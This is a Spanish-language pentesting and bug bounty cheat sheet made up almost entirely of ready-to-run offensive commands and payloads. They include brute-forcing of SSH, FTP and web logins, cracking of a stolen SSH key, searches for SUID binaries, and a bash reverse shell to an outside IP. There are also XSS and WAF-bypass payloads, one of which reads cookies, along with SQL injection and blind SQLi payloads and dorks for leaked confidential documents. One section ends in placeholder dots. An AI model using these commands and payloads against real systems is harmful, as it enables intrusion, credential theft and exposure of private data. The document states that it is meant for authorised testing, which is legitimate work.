# ***I. Pentesting - Notes***

`Pentesting Notes` es una documento donde encontraras comandos para ayudarte rapidamente a realizar pentesting desde lo mas básico a lo avanzado.

## Nmap

1. Usar **-T2** para entornos reales

   ```bash
   nmap -p- --open -T5 -v -n <TARGET_IP> -oG allPorts
   ```

2. Si quiere que el escaneo sea muy pero muy rápido (no es aconsejado en pentesting real), utilizar el comando **-sS** (tcp syn port scan) y el parámetro **--min-rate** (controla el número de paquetes que quieres enviar, por ejemplo 5000 por segundo) y el comando **-Pn** (es para evitar el descubrimiento de host mediante la resolución de nombre del protocolo ARP). 

   ```bash
   nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn <TARGET_IP> -oG allPorts
   ```

3. Escaneo de **puertos**

   ```bash
   nmap -sC -sV -p22,80 <TARGET_IP> -oN targeted
   ```

4. Usando **script**

   ```bash
   nmap -sV -vv --script vuln <TARGET_IP>
   ```

## Gobuster

1. Para realizar ataques de **fuerza bruta** contra URI (directorios y archivos), subdominios DNS y nombres de host virtuales

   ```bash
   gobuster -u http://example.com -w wordlist.txt dir
   ```
   ```bash
   gobuster dir -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
   ```

## wfuzz

1. Para realizar ataques de **fuerza bruta** en APIs

   ```bash
   wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login --hc 405
   ```

## Hydra

1. Para realizar ataques de **fuerza bruta** de contraseñas FTP, SSH

   ```bash
   hydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt -vV <TARGET_IP> ftp
   ```
   ```bash
   hydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt -vV <TARGET_IP> ssh
   ```
   ```bash
   hydra -l <username> -P passlist.txt ftp://<TARGET_IP>
   ```
   ```bash
   hydra -l <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
   ```
   ```bash
   hydra -l <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "login/:username=^USER^&password=^PASS^:F=incorrect" -V
   ```

## Enum4linux: SMB

1. Enum4linux es una herramienta que se utiliza para enumerar recursos compartidos SMB tanto en sistemas Windows como Linux. Opciones **-U** (get userlist), **-M** (get machine list), **-N** (get namelist dump (different from -U and-M)), **-S**  (get sharelist), **-P**  (get password policy information), **-G** (get group and member list) and **-a** (all of the above (full basic enumeration)).

   ```bash
   enum4linux -a <TARGET_IP> 
   ```

2. Para acceder de forma remota al recurso compartido SMB

   ```bash
   smbclient //<TARGET_IP>/<SHARE>
   ```  

## Rockyou

1. Descomprimir

   ```bash
   gzip -d /usr/share/wordlists/rockyou.txt.gz
   ```

## SSH

1. Realizar un conexión remota

   ```bash
   ssh user@<TARGET_IP>
   ```
   ```bash
   ssh -oHostKeyAlgorithms=+ssh-rsa user@<TARGET_IP>
   ```

2. Realizar un conexión remota mendiante id_rsa

   Primer ver si se puede ver el archivo ocult id_rsa de la ruta del otro usuario
   ```bash
   ls /home/<username>/.ssh
   ```
   Si se puede ver, copiar el contenido de id_rsa en un archivo de la maquina del pentester
   ```bash
   cat id_rsa 
   ```
   Dar permiso de ejecución.
   ```bash
   chmod +x id_rsa
   ```
   Obtener el hash del fichero id_rsa usando **ssh2john**
   ```bash
   /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
   ```
   Realizar fuerza bruta al hash obtenido del fichero id_rsa.hash usando **John The Riper**
   ```bash
   sudo john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
   ```
   Finalmente conectarse de esta forma y le solicitara ingresar la contraseña para la clave 'id_rsa'.
   ```bash
   sudo ssh -i id_rsa <username>@<TARGET_IP>
   ```

## NSF

1. Montar NFS compartidos

   ```bash
   sudo mount -t nfs IP:share /tmp/mount/ -nolock
   ```


# Linux: Privilege escalation

1. Buscar permisos en todos los archivos SUID

   ```bash
   find / -user root -perm -4000 -exec ls -ldb {} \; 
   ```
   ```bash
   find / -perm -u=s -exec ls -l {} \; 2>/dev/null 
   ```


# Data Base: SQL, MYSQL, SQLITE

1. Leear archivos sqlite
   
   ```bash
   sqlite3 example.db
   sqlite> .tables
   sqlite> PRAGMA table_info(customers);
   sqlite> SELECT * FROM customers;
   ```
   

# Linux: Comandos mas usados

1. Para trasnferir archivos usando nc

   Ejecutar en el host donde va a pasar los archivos
   ```bash
   nc -l -p 1234 > LinEnum.sh 
   ```
   Ejecutar host donde estan los archvios
   ```bash
   cat /home/user/tools/privesc-scripts/LinEnum.sh | nc 10.9.2.251 1234
   ```

2. Para trasnferir archivos usando python3 y wget o curl

   Ejetuar en donde estan los archivos
   ```bash
   python3 -m http.server 8080 
   ```
   Ejecutar en donde descargar los archivos
   ```bash
   wget http://10.9.2.251:8080/lse.sh -O /home/sn0w/lse.sh 
   ```
   ```bash
   curl -o /home/sn0w/lse.sh http://10.9.2.251:8080/lse.sh 
   ```
3. Encontrar archivos

   ```bash
   find -name passwords.txt 
   ```
   ```bash
   find -name *.txt 
   ```
 4. Poner en escucha con netcat

   ```bash
   nc -nlvp 4444
   ```
 5. Crear una reverse shell TCP

   ```bash
   /bin/bash -c 'bash -i >& /dev/tcp/10.9.2.251/4444 0>&1'
   ``` 

# Sitios Web

1. Para descifrar hashes de contraseñas débiles

   ```bash
   https://crackstation.net/
   ```
2. Para buscar exploit's

   ```bash
   https://www.exploit-db.com/exploits/
   ```
3. Para buscar CVE's

   ```bash
   https://nvd.nist.gov/vuln/search
   ```
   ```bash
   https://cve.mitre.org/
   ```
   ```bash
   https://www.cvedetails.com/
   ```
4. Para codificar y decodificar

   ```bash
   https://gchq.github.io/CyberChef/
   ```
   ```bash
   https://appdevtools.com/base64-encoder-decoder
   ```


# Extensiones para web browser

1. Ripper Web Content | Capture Metadata Content

   Ofrecido por Miguel Segovia - Correo electrónico miguelsegovia21@gmail.com 
   ```bash
   https://chromewebstore.google.com/detail/ripper-web-content-captur/popfhajlkgkiecedhefhifccngogomgh?hl=es-419&utm_source=ext_sidebar
   ```

2. User-Agent Switcher for Chrome

   Desarrollador Google 1600 Amphitheatre Pkwy Mountain View, CA 94043 US - Correo electrónico cbe-cws-admins@google.com
   ```bash
   https://chromewebstore.google.com/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg?hl=es-419&utm_source=ext_sidebar
   ```






# ***II. Bug bounty - Notes***

`Bug bounty notes` es una documento donde encontraras comandos para ayudarte rapidamente a realizar Bug bounty desde lo mas básico a lo avanzado.

## Katana

1. Para encontrar documentos confidenciales, sensibles y a datos de PII.

   ```bash
   katana -u subdomainsList -em pdf,docx | tee endpointsPDF_DOC
   ```
   ```bash
   grep -i 'redacted.*\.pdf$' endpointsPDF_DOC | sed -E 's/[-_]?redacted//gi' | sort -u | httpx -mc 200 -sc
   ```

2. Enumerar de forma pasiva todos los puntos finales de un sitio web.

   ```bash
   echo ejemplo.com | katana -passive -f qurl -pss waybackarchive,commoncrawl,alienvault | httpx -mc 200 | grep -E '\.(js|php)$' | tee specificEndpoints
   ```

## Nuclei

1. Para detectar sitios web de phishing.

   ```bash
   nuclei -l websites_Possible_Phishing -tags phishing -itags phishing
   ```
   
## XSS Reflejado

1. XXS reflejado con zero click en un '<'input'>' vulnerable

   ```bash
   hola" " onfocus="alert(document.domain)" autofocus="
   ```

## XSS Almacenado

1. Crea un fichero en linux y luego sube ese archivo a través de un cargador, tendrás un XSS almacenado si el nombre del archivo está almacenado y el desarrollador se ha olvidado de desinfectar este campo.

   ```bash
   touch '"><img src=x onerror=alert("xss!")>.pdf'
   ```
   
## SQL Injection

1. SQL Injection.
   
   Ejemplo: En el campo email_user='+||+(1)=(1)+LiMiT+1--+-$pwd=123
   ```bash
   '+||+(1)=(1)+LiMiT+1--+-
   ```

   Ejemplo: GET http:....../order=nombre&sort=-1+OR+IF(MID(version(),1,5)='5.7.2',BENCHMARK(900000,SHA1(1)),1)--
   ```bash
   -1+OR+IF(MID(version(),1,5)='5.7.2',BENCHMARK(900000,SHA1(1)),1)--
   ```
   Otros
   ```bash
   '%2BIF(MID(version(),1,6)='10.3.2',sleep(5),v))%2B'
   ```
  
## SQL Injection Blind

1. Blind SQL Injection MySQL.
   Ejemplo: En la cabecera GET
   ```bash
   -1+OR+IF(1%3d1,+(SELECT+1+FROM+(SELECT+SLEEP(MID(version(),1)))+AS+v),+0)
   ```
   Ejemplo: search='OR+(SELECT+1+FROM+(SELECT(SLEEP(MID(version(),1,1))))test)+OR+'.test'='.test
   ```bash
   'OR+(SELECT+1+FROM+(SELECT(SLEEP(MID(version(),1,1))))test)+OR+'.test'='.test
   ```

2. Blind SQL PostgreSQL.

   Ejemplo: GET /pagina.php?valor=(SELECT+1+FROM+pg_sleep((ASCII((SELECT+datname+FROM+pg_database+LIMIT+1))+-+32)+/+2))
   ```bash
   (SELECT+1+FROM+pg_sleep((ASCII((SELECT+datname+FROM+pg_database+LIMIT+1))+-+32)+/+2))
   ```
   
## PureDNS

1. Resolver/forzar mediante DNS

   ```bash
   puredns bruteforce best-dns-wordlist.txt dominio.com -r resolvers.txt -w dns | httpx -mc 200 -o subdomain_output.txt 
   ```

## Azure Active Directory

1. Enumeración dominios y subdominios con AADInternals en PowerShell (aplica solo si la empresa utiliza Azure AD, de lo contario esta técnica es inútil).

   ```bash
   PS C:\WINDOWS\system32> Get-AADIntTenantDomains -Domain cisco.onmicrosoft.com
   ```

## AWS

1. Detectar configuraciones incorrectas y vulnerabilidades en nube (especificamente en AWS, detecta buckets de S3 e instancias EC2 mal configurados).

   ```bash
   nuclei -config ~/nuclei-templates/profiles/aws-cloud-config.yml -s critical,high --silent
   ```

2. Control de un bucket de S3

   ```bash
   echo EJEMPLO.COM | cariddi | grep js | tee js_files | httpx -mc 200 | nuclei -tags aws,amazon
   ```
   
## Bypass WAF

1. **XSS payloads**.

   ```bash
   "><img/src=%20only=1%20OnErRor=x=alert`XSS`><!--
   ```
   ```bash
   "><details/open/id="&XSS"ontoggle​=alert("XSS_WAF_BYPASS_:-)")>
   ```
   ```bash
   "><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
   ```
   ```bash
   1'"();<test><ScRiPt >window.alert("XSS_WAF_BYPASS")</ScRiPt>
   ```
   ```bash
   "><input%0a%0atype="hidden"%0a%0aoncontentvisibilityautostatechange=confirm(/paulportanc/)%0d%0astyle=content-visibility:auto>
   ```
   ```bash
   "><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
   ```
   ```bash
   <p oncontentvisibilityautostatechange="alert(/FirefoxOnly/)" style="content-visibility:auto">
   ```
   
## Shodan

1. Obtener todas las IPs de Shodan sin ninguna cuenta premium

   - Una vez estando en Shodan en Facet Analysis, precionar F12 e ir a Console y escribir: **allow pasting**
   - Copiar el siguiente código
   ```bash
   var ipElements=document.querySelectorAll('strong');var ips=[];ipElements.forEach(function(e){ips.push(e.innerHTML.replace(/["']/g,''))});var ipsString=ips.join('\n');var a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(ipsString);a.download='shodanips.txt';document.body.appendChild(a);a.click();
   ```
   
## APIs Móvil

1. Enumerar la superficie de ataque, obtener API KEYS y puntos finales de API.

   - Descarga el .apk usando APKCombo o APKPure.
   - Escaneo de archivos APK en busca de URI, puntos finales y secrets:
   ```bash
   apkleaks -f com.EJEMPLO.COM.apk -o output_endpoints_apikeys
   ```
   - Validar API KEY encontrada con nuclei:
   ```bash
   nuclei -t nuclei-templates/http/token-spray -var token=<API_KEY_FOUND>
   ```
   
## Google Dorks

1. Para encontrar datos de PII o información reservada para los procesos de negocio.

   ```bash
   site:*.EJEMPLO.COM (ext:doc OR ext:docx OR ext:pdf OR ext:rtf OR ext:ppt OR ext:csv OR ext:xls) (intext:confidential OR intext:privileged OR intext:unredacted OR intext:secret OR intext:reserved)
   ```






# ***III. Metodologia XXS***

`Herramientas utilizadas`.
  ```bash
 https://github.com/lc/gau
 https://github.com/tomnomnom/gf
 https://github.com/coffinxp/gFpattren
 https://github.com/s0md3v/uro
 https://github.com/KathanP19/Gxss
 https://github.com/Emoe/kxss
 https://github.com/coffinxp/loxs
```

1. ...........

   ```bash
   -........)
   ```


> [!Warning]
> 
> # DISCLAIMER
> Este documento está destinado únicamente para fines educativos y de hacking ético. Sólo debe utilzarse para probar sistemas de su propiedad o para los que tenga permiso explícito para probar. El uso no autorizado de sitios web o sistemas de terceros sin consentimiento es ilegal y poco ético.
